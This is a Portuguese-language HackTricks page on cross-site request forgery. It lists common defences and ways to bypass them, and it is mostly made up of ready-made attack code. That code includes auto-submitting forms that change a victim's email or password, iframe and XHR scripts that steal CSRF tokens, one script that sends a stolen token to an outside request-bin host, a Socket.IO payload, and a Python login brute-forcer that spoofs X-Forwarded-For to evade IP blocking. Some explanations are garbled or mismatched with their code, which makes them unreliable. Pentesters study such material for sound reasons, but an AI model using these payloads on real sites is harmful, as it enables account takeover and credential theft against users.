# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novos programas de recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## O que √© CSRF?

**Cross-site request forger**y (tamb√©m conhecido como CSRF) √© uma vulnerabilidade de seguran√ßa na web que permite que um invasor **induza usu√°rios a executar a√ß√µes que eles n√£o pretendem executar**.\
Isso √© feito **fazendo um usu√°rio logado** na plataforma da v√≠tima acessar um site controlado pelo atacante e a partir da√≠ **executar** c√≥digo JS malicioso, enviar formul√°rios ou recuperar "imagens" para a **conta da v√≠tima**.

### Requisitos

Para ser capaz de explorar uma vulnerabilidade CSRF, voc√™ primeiro precisa **encontrar uma a√ß√£o relevante para explorar** (alterar senha ou e-mail, fazer a v√≠tima segui-lo em uma rede social, dar mais privil√©gios...). A **sess√£o deve depender apenas de cookies ou do cabe√ßalho de autentica√ß√£o b√°sica HTTP**, nenhum outro cabe√ßalho pode ser usado para manipular a sess√£o. E finalmente, **n√£o deve haver par√¢metros imprevis√≠veis** na solicita√ß√£o.

V√°rias **contramedidas** podem ser implementadas para evitar essa vulnerabilidade.

### **Defesas comuns**

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Se o cookie de sess√£o estiver usando essa flag, voc√™ pode n√£o ser capaz de enviar o cookie de sites da web arbitr√°rios.
* [**Compartilhamento de recursos entre origens**](cors-bypass.md): Dependendo do tipo de solicita√ß√£o HTTP que voc√™ precisa executar para explorar a a√ß√£o relevante, voc√™ pode levar em conta a **pol√≠tica CORS do site da v√≠tima**. _Observe que a pol√≠tica CORS n√£o afetar√° se voc√™ apenas quiser enviar uma solicita√ß√£o GET ou uma solicita√ß√£o POST de um formul√°rio e n√£o precisar ler a resposta._
* Pe√ßa a **senha** do usu√°rio para autorizar a a√ß√£o.
* Resolva um **captcha**
* Leia os cabe√ßalhos **Referer** ou **Origin**. Se uma express√£o regular for usada, ela poder√° ser contornada, por exemplo, com:
  * http://mal.net?orig=http://example.com (termina com a URL)
  * http://example.com.mal.net (come√ßa com a URL)
* **Modifique** o **nome** dos **par√¢metros** da solicita√ß√£o Post ou Get
* Use um **token CSRF** em cada sess√£o. Este token deve ser enviado dentro da solicita√ß√£o para confirmar a a√ß√£o. Este token pode ser protegido com CORS.

### Mapa CSRF

![](<../.gitbook/assets/image (112).png>)

## Bypass de defesas

### De POST para GET

Talvez o formul√°rio que voc√™ deseja explorar esteja preparado para enviar uma **solicita√ß√£o POST com um token CSRF, mas** voc√™ deve **verificar** se um **GET** tamb√©m √© **v√°lido** e se, quando voc√™ envia uma solicita√ß√£o GET, o **token CSRF ainda est√° sendo validado**.

### Falta de token

Algumas aplica√ß√µes **validam corretamente o token quando ele est√° presente, mas ignoram a valida√ß√£o se o token for omitido**.\
Nessa situa√ß√£o, o invasor pode **remover todo o par√¢metro** contendo o token (n√£o apenas o seu valor) para contornar a valida√ß√£o e realizar um ataque CSRF.

### Token CSRF n√£o est√° vinculado √† sess√£o do usu√°rio

Algumas aplica√ß√µes **n√£o validam que o token pertence √† mesma sess√£o** do usu√°rio que est√° fazendo a solicita√ß√£o. Em vez disso, a aplica√ß√£o **mant√©m um pool global de tokens** que emitiu e aceita qualquer token que apare√ßa neste pool.\
Nessa situa√ß√£o, o invasor pode fazer login na aplica√ß√£o usando sua pr√≥pria conta, **obter um token v√°lido** e, em seguida, **alimentar esse token para o usu√°rio v√≠tima** em seu ataque CSRF.

### Bypass de m√©todo

Se a solicita√ß√£o estiver usando um **m√©todo "estranho"**, verifique se a **funcionalidade de substitui√ß√£o de m√©todo** est√° funcionando.\
Por exemplo, se estiver **usando um m√©todo PUT**, voc√™ pode tentar **usar um m√©todo POST** e **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Isso tamb√©m pode funcionar enviando o **par√¢metro \_method dentro de uma solicita√ß√£o POST** ou usando os **cabe√ßalhos**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Bypass de token de cabe√ßalho personalizado

Se a solicita√ß√£o estiver adicionando um **cabe√ßalho personalizado** com um **token** para a solicita√ß√£o como **m√©todo de prote√ß√£o CSRF**, ent√£o:

* Teste a solicita√ß√£o sem o **Token Personalizado e tamb√©m sem o cabe√ßalho**.
* Teste a solicita√ß√£o com **exatamente o mesmo comprimento, mas com um token diferente**.

### O token CSRF √© verificado por um cookie

Em uma varia√ß√£o adicional da vulnerabilidade anterior, algumas aplica√ß√µes **duplicam cada token em um cookie e um par√¢metro de solicita√ß√£o**. Ou **definem um cookie csrf** e **verificam no backend se o token csrf enviado √© o relacionado com o cookie**.

Quando a solicita√ß√£o subsequente √© validada, a aplica√ß√£o simplesmente verifica se o **token** enviado no **par√¢metro da solicita√ß√£o corresponde** ao valor armazenado pelo **cookie**.\
Nessa situa√ß√£o, o invasor pode novamente realizar um **ataque CSRF se o site da web contiver alguma vulnerabilidade que permita que ele defina seu cookie CSRF para a v√≠tima como um CRLF**.

Nesse caso, voc√™ pode definir o cookie tentando carregar uma imagem falsa e, em seguida, lan√ßar o ataque CSRF como neste exemplo:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```
{% hint style="info" %}
Observe que se o **token csrf estiver relacionado ao cookie da sess√£o, esse ataque n√£o funcionar√°** porque voc√™ precisar√° definir a sess√£o da v√≠tima e, portanto, estar√° atacando a si mesmo.
{% endhint %}

### Mudan√ßa de Content-Type

De acordo com [**isto**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar solicita√ß√µes de pr√©-voo** usando o m√©todo **POST**, esses s√£o os valores permitidos para Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

No entanto, observe que a **l√≥gica dos servidores pode variar** dependendo do **Content-Type** usado, portanto, voc√™ deve tentar os valores mencionados e outros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemplo (de [aqui](https://brycec.me/posts/corctf\_2021\_challenges)) de envio de dados JSON como texto simples:
```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>
```
### Bypass de solicita√ß√£o de pr√©-voo de aplicativo/json

Como voc√™ j√° sabe, n√£o √© poss√≠vel enviar uma solicita√ß√£o POST com o Content-Type **`application/json`** via formul√°rio HTML e, se voc√™ tentar fazer isso via **`XMLHttpRequest`**, uma solicita√ß√£o de pr√©-voo √© enviada primeiro.\
No entanto, voc√™ pode tentar enviar os dados JSON usando os tipos de conte√∫do **`text/plain`** e **`application/x-www-form-urlencoded`** apenas para verificar se o backend est√° usando os dados independentemente do Content-Type.\
Voc√™ pode enviar um formul√°rio usando `Content-Type: text/plain` definindo **`enctype="text/plain"`**

Se o servidor estiver aceitando apenas o tipo de conte√∫do "application/json", voc√™ pode **enviar o tipo de conte√∫do "text/plain; application/json"** sem acionar uma solicita√ß√£o de pr√©-voo.

Voc√™ tamb√©m pode tentar **burlar** essa restri√ß√£o usando um **arquivo flash SWF**. Para mais informa√ß√µes, [**leia este post**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass de verifica√ß√£o de Referer / Origin

**Evite o cabe√ßalho Referer**

Algumas aplica√ß√µes validam o cabe√ßalho Referer quando ele est√° presente em solicita√ß√µes, mas **ignoram a valida√ß√£o se o cabe√ßalho for omitido**.
```markup
<meta name="referrer" content="never">
```
**Burlas de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para definir o nome de dom√≠nio do servidor na URL que o Referrer vai enviar dentro dos par√¢metros, voc√™ pode fazer:
```html
<html>
  <!-- Referrer policy needed to send the qury parameter in the referrer -->
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // You need to set this or the domain won't appear in the query of the referer header
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```
***

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## **Exemplos de Explora√ß√£o**

### **Exfiltrando Token CSRF**

Se um **token CSRF** est√° sendo usado como **defesa**, voc√™ pode tentar **exfiltr√°-lo** abusando de uma vulnerabilidade [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou uma vulnerabilidade [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET usando tags HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Outras tags HTML5 que podem ser usadas para enviar automaticamente uma solicita√ß√£o GET s√£o:

![](<../.gitbook/assets/image (530).png>)

### Solicita√ß√£o GET de formul√°rio
```markup
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### Solicita√ß√£o de POST de formul√°rio
```markup
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>
```
### Solicita√ß√£o de POST de formul√°rio por meio de iframe
```markup
<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### **Requisi√ß√£o POST Ajax**

O CSRF tamb√©m pode ser explorado em requisi√ß√µes POST Ajax. Nesse caso, o atacante pode criar uma p√°gina maliciosa que envia uma requisi√ß√£o POST para o servidor alvo usando o m√©todo `XMLHttpRequest`. O atacante pode ent√£o enganar o usu√°rio para que ele visite a p√°gina maliciosa, que enviar√° a requisi√ß√£o POST sem o conhecimento do usu√°rio. Para evitar esse tipo de ataque, √© importante incluir um token CSRF em todas as requisi√ß√µes POST, incluindo as feitas por meio de Ajax.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```
### Solicita√ß√£o POST multipart/form-data
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
```
### Solicita√ß√£o POST multipart/form-data v2

Nesta t√©cnica, o atacante cria um formul√°rio HTML falso que envia uma solicita√ß√£o POST multipart/form-data para o site alvo. O formul√°rio √© projetado para enviar uma solicita√ß√£o para alterar informa√ß√µes confidenciais do usu√°rio, como senha ou endere√ßo de e-mail. O atacante, em seguida, envia o link do formul√°rio falso para a v√≠tima, geralmente por meio de engenharia social, e espera que a v√≠tima preencha o formul√°rio e envie a solicita√ß√£o. Quando a v√≠tima envia a solicita√ß√£o, o atacante pode intercept√°-la e modificar os dados enviados para o site alvo.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Solicita√ß√£o de POST de formul√°rio de dentro de um iframe
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Roubar o Token CSRF e enviar uma requisi√ß√£o POST**

Para realizar um ataque CSRF, √© necess√°rio obter o token CSRF v√°lido do usu√°rio alvo. Isso pode ser feito atrav√©s de um ataque de phishing ou explorando vulnerabilidades em outros aplicativos da web que o usu√°rio esteja logado. Uma vez que o token CSRF √© obtido, o atacante pode enviar uma requisi√ß√£o POST maliciosa para o aplicativo da web alvo, enganando-o para executar a a√ß√£o desejada pelo atacante. √â importante notar que o token CSRF √© geralmente espec√≠fico para cada sess√£o do usu√°rio e pode expirar ap√≥s um determinado per√≠odo de tempo.
```javascript
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o Post usando um iframe, um formul√°rio e Ajax**

Para realizar um ataque CSRF, o invasor precisa obter o token CSRF v√°lido do usu√°rio alvo. Uma vez que o token CSRF √© obtido, o invasor pode enviar uma solicita√ß√£o POST maliciosa para o servidor usando um iframe, um formul√°rio ou Ajax.

#### **Usando um iframe**

O invasor pode criar um iframe invis√≠vel em uma p√°gina maliciosa que envia uma solicita√ß√£o POST para o servidor usando o token CSRF roubado. Quando a v√≠tima visita a p√°gina maliciosa, a solicita√ß√£o POST √© enviada sem o conhecimento da v√≠tima.

#### **Usando um formul√°rio**

O invasor pode criar um formul√°rio em uma p√°gina maliciosa que envia uma solicita√ß√£o POST para o servidor usando o token CSRF roubado. Quando a v√≠tima envia o formul√°rio, a solicita√ß√£o POST √© enviada sem o conhecimento da v√≠tima.

#### **Usando Ajax**

O invasor pode usar o Ajax para enviar uma solicita√ß√£o POST para o servidor usando o token CSRF roubado. O invasor pode criar um script em uma p√°gina maliciosa que envia a solicita√ß√£o POST sem o conhecimento da v√≠tima.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o POST usando um iframe e um formul√°rio**

Para realizar um ataque CSRF, o invasor precisa obter o token CSRF v√°lido do usu√°rio alvo. Uma maneira de fazer isso √© usando um iframe e um formul√°rio para enviar uma solicita√ß√£o POST para o site alvo.

O primeiro passo √© criar um iframe que aponte para o site alvo. Em seguida, um formul√°rio √© criado dentro do iframe com o m√©todo POST e o destino definido como a URL que o invasor deseja atacar. O formul√°rio tamb√©m deve incluir todos os campos necess√°rios para a solicita√ß√£o POST, incluindo o token CSRF v√°lido do usu√°rio alvo.

Quando o usu√°rio alvo visita a p√°gina do invasor, o iframe √© carregado e o formul√°rio √© enviado automaticamente, sem que o usu√°rio perceba. Como o formul√°rio √© enviado do contexto do site alvo, o servidor aceita a solicita√ß√£o como leg√≠tima e executa a a√ß√£o desejada, como excluir uma conta ou alterar uma senha.

Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como a inclus√£o de tokens CSRF exclusivos em cada formul√°rio e a valida√ß√£o desses tokens no servidor antes de executar qualquer a√ß√£o.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>
```
### **Roubar token e envi√°-lo usando 2 iframes**

Este m√©todo √© semelhante ao anterior, mas em vez de usar um formul√°rio oculto, usamos dois iframes. O primeiro iframe √© usado para enviar uma solicita√ß√£o GET para a p√°gina que cont√©m o formul√°rio que queremos enviar. O segundo iframe √© usado para enviar o formul√°rio com o token roubado. Aqui est√° o c√≥digo HTML:

```html
<iframe src="https://www.example.com/get-form-page"></iframe>
<iframe id="hidden-iframe" style="display:none;"></iframe>
<script>
  var token = document.getElementsByName('csrf_token')[0].value;
  var form = document.createElement('form');
  form.setAttribute('method', 'post');
  form.setAttribute('action', 'https://www.example.com/post-form-page');
  var input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'csrf_token');
  input.setAttribute('value', token);
  form.appendChild(input);
  document.getElementById('hidden-iframe').contentDocument.body.appendChild(form);
  form.submit();
</script>
```

O primeiro iframe √© usado para carregar a p√°gina que cont√©m o formul√°rio que queremos enviar. O JavaScript no segundo iframe √© usado para roubar o token do formul√°rio e envi√°-lo usando um formul√°rio oculto. O formul√°rio √© enviado usando o m√©todo POST para a p√°gina que processa o formul√°rio.

Este m√©todo √© mais complicado do que o anterior, mas pode ser mais eficaz em alguns casos.
```markup
<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token com Ajax e enviar um post com um formul√°rio**

Para realizar um ataque CSRF, √© necess√°rio obter o token CSRF v√°lido do usu√°rio alvo. Uma maneira de fazer isso √© usando uma solicita√ß√£o Ajax para obter o token e, em seguida, enviar um POST com um formul√°rio contendo o token. O c√≥digo abaixo mostra como isso pode ser feito:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/get_csrf_token', true);
xhr.onload = function () {
  var token = xhr.responseText;

  var form = document.createElement('form');
  form.setAttribute('method', 'POST');
  form.setAttribute('action', '/api/change_password');

  var hiddenField = document.createElement('input');
  hiddenField.setAttribute('type', 'hidden');
  hiddenField.setAttribute('name', 'csrf_token');
  hiddenField.setAttribute('value', token);
  form.appendChild(hiddenField);

  document.body.appendChild(form);
  form.submit();
};
xhr.send();
```

Este c√≥digo faz uma solicita√ß√£o Ajax para `/api/get_csrf_token` para obter o token CSRF v√°lido. Em seguida, ele cria um formul√°rio com um campo oculto contendo o token e envia o formul√°rio usando o m√©todo `submit()`. O servidor receber√° o POST com o token CSRF v√°lido e processar√° a solicita√ß√£o como se fosse do usu√°rio leg√≠timo.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>
```
### CSRF com Socket.IO

Socket.IO √© uma biblioteca JavaScript que permite comunica√ß√£o em tempo real entre o servidor e o cliente. Ele usa WebSockets como protocolo de transporte padr√£o, mas tamb√©m pode usar outras tecnologias de transporte, como AJAX long polling. Como o Socket.IO √© baseado em JavaScript, ele √© vulner√°vel a ataques CSRF.

Para explorar uma vulnerabilidade CSRF em um aplicativo que usa Socket.IO, o atacante pode criar um site malicioso que envia uma solicita√ß√£o para o servidor Socket.IO do aplicativo de destino. A solicita√ß√£o pode ser enviada usando o m√©todo `emit()` do Socket.IO, que √© usado para enviar mensagens personalizadas entre o servidor e o cliente.

Para proteger um aplicativo Socket.IO contra ataques CSRF, √© importante usar tokens CSRF. O token CSRF deve ser gerado pelo servidor e inclu√≠do em todas as solicita√ß√µes enviadas pelo cliente. O servidor deve verificar se o token CSRF √© v√°lido antes de processar a solicita√ß√£o.

Para gerar um token CSRF em um aplicativo Socket.IO, o servidor pode usar a biblioteca `csurf`. A biblioteca `csurf` √© uma middleware do Express que fornece prote√ß√£o CSRF para aplicativos Node.js. Ele gera um token CSRF exclusivo para cada solicita√ß√£o e o inclui no corpo da solicita√ß√£o ou no cabe√ßalho da solicita√ß√£o.

Para usar o `csurf` com o Socket.IO, o servidor deve primeiro criar uma inst√¢ncia do middleware `csurf` e, em seguida, adicion√°-lo √† pilha de middleware do Express. O middleware `csurf` adicionar√° o token CSRF a todas as solicita√ß√µes recebidas pelo servidor. O cliente deve incluir o token CSRF em todas as solicita√ß√µes enviadas ao servidor Socket.IO. O servidor deve verificar se o token CSRF √© v√°lido antes de processar a solicita√ß√£o.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>
```
## CSRF Login Brute Force

O c√≥digo pode ser usado para for√ßar a entrada em um formul√°rio de login usando um token CSRF (tamb√©m est√° usando o cabe√ßalho X-Forwarded-For para tentar contornar um poss√≠vel bloqueio de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```
## Ferramentas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Refer√™ncias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

